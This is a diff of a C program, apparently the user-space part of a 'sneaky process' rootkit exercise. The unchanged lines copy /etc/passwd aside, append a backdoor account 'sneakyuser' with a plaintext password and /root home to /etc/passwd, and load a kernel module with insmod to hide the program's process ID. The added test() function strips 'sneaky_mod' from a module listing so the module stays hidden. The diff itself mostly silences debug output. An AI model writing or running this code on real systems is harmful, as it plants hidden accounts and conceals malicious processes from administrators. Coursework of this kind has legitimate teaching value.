@@ -17,7 +17,7 @@ void cpFile(const char * file1, const char * file2) {
   while ((cnt = fgetc(f1)) != EOF) {
     fputc(cnt, f2);
   }
-  printf("Succesfully copy\n");
+  //printf("Succesfully copy\n");
   fclose(f1);
   fclose(f2);
 }
@@ -29,15 +29,15 @@ void appendFile(const char * fileName, const char * cnt) {
     printf("File open failed in appendFile\n");
     exit(1);
   }
-  printf("before fputs\n");
+  //printf("before fputs\n");
   fputs(cnt, f1);
   fclose(f1);
-  printf("Succesfully append\n");
+  //printf("Succesfully append\n");
 }
 
 void loop() {
   int recved;
-  printf("inside loop\n");
+  //printf("inside loop\n");
   do {
     recved = getchar();
     putchar(recved);
@@ -47,11 +47,11 @@ void loop() {
 char * insmodCmd(int pid) {
   char pidArr[50];
   int digits = sprintf(pidArr, "%d", pid);
-  printf("pidArr: %s\n", pidArr);
-  printf("digits: %d\n", digits);
+  // printf("pidArr: %s\n", pidArr);
+  //printf("digits: %d\n", digits);
   char * res = malloc(sizeof(char) * 1000);
   strcpy(res, "insmod sneaky_mod.ko str=\"sneaky_process\" pidstr=\"");
-  printf("res before loop: %s\n", res);
+  //printf("res before loop: %s\n", res);
   int len = strlen(res);
   for (int i = 0; i < digits + 1; i++) {
     if (i == digits) {
@@ -65,6 +65,36 @@ char * insmodCmd(int pid) {
   return res;
 }
 
+void test() {
+  FILE * f = fopen("./try.txt", "r");
+  char txt[100000];
+  char ch;
+  int i = 0;
+  while((ch=getc(f)) != EOF) {
+    txt[i] = ch;
+    i++;
+  }
+  txt[i] = '\0';
+  printf("prev:\n %s\n", txt);
+  const char * target = "sneaky_mod";
+  char * idx = strstr(txt, target);
+  if(idx != NULL) {
+    char * newLineIdx = strchr(idx, '\n');
+    if(newLineIdx == NULL) {
+      newLineIdx = idx + 9;
+    }
+    memmove(idx, newLineIdx+1, i-(idx-txt+newLineIdx-idx+1));
+    txt[i-(newLineIdx-idx+1)] = '\0';
+  }
+  printf("after:\n %s\n", txt);
+}
+
+/*
+int main() {
+  test();
+  return 0;
+}  */
+
 int main() {
   // print own process ID
   pid = getpid();
@@ -74,7 +104,7 @@ int main() {
   cpFile("/etc/passwd", "/tmp/passwd");
   appendFile("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
   char * cmd1 = insmodCmd(pid);
-  printf("%s\n", cmd1);
+  // printf("%s\n", cmd1);
   int res1 = system(cmd1);
   if (res1 == -1) {return -1;}
   free(cmd1);
@@ -84,4 +114,4 @@ int main() {
   cpFile("/tmp/passwd", "/etc/passwd");
 
   return 0;
-}
+}   
